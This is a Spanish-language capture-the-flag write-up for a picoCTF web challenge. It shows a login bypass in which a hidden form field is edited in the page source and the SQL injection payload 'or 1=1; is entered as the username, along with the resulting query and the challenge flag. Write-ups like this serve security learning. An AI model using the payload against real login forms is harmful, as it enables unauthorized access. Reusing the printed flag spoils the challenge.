# Irish-Name-Repo 1


## Descripción
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!

## Pistas
- There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
- Try to think about how the website verifies your login.

## Solución

- Entramos a la pagina web: [link](https://jupiter.challenges.picoctf.org/problem/33850/)  
- Se intenta entrar con un usuario y una contraseña cualquiera pero nos Manda un "Error de inicio de sesion", lo cual quiere decir no podemos entrar a encntrar la bandera.
- Para poder encontrar la bandera hacemos uso de SQL Injection.
- Dando click derecho en la pagina web seleccionamos la opción "Inspeccionar", nos abre el código funte donde borramos el hidden de una linea del código fuente esto nos permite poner un 1 en el login para poder entrar.
- Despues de haber ingresado el 1 procedemos a utilizar la Inyección "'or 1=1;" como usuario para poder encontrar la contraseña:
``` bash
username: 'or 1=1;
password: karen
SQL query: SELECT * FROM users WHERE name=''or 1=1;' AND password='karen'

Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
```

## Bandera
picoCTF{s0m3_SQL_f8adf3fb}

## Notas adicionales
| Concepto | Descripción |
|------ | -------------- |
| 1=1 | El propósito es crear una instrucción SQL para seleccionar un usuario, con una identificación de usuario dada. Si no hay nada que impida que un usuario ingrese una entrada "incorrecta", el usuario puede ingresar alguna entrada "inteligente" ||


## Referencias
- [SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)




